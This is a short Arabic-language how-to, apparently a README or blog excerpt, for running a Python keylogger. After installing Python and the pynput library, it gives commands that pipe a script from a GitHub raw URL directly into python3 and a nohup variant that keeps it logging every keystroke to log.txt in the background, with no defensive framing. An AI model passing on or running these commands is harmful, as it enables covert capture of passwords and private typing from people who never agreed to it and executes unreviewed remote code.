إذا لم يكن Python مثبتًا، يمكنك تثبيته باستخدام:

sudo apt update

sudo apt install python3


بعد ذلك، تحتاج إلى تثبيت مكتبة pynput التي سنستخدمها لتسجيل ضغطات المفاتيح:
pip3 install pynput

لتشغيل الـkeylogger، استخدم الأمر التالي:

python3 <(curl -s https://raw.githubusercontent.com/osama-mousa/python-scripts/main/keylogger.py)


لتشغيله في الخلفية دون إغلاق الجلسة، يمكنك استخدام أدوات مثل nohup:

nohup python3 <(curl -s https://raw.githubusercontent.com/osama-mousa/python-scripts/main/keylogger.py) &


سيبدأ البرنامج الآن في تسجيل كل ضغطة على لوحة المفاتيح في ملف log.txt 🎉
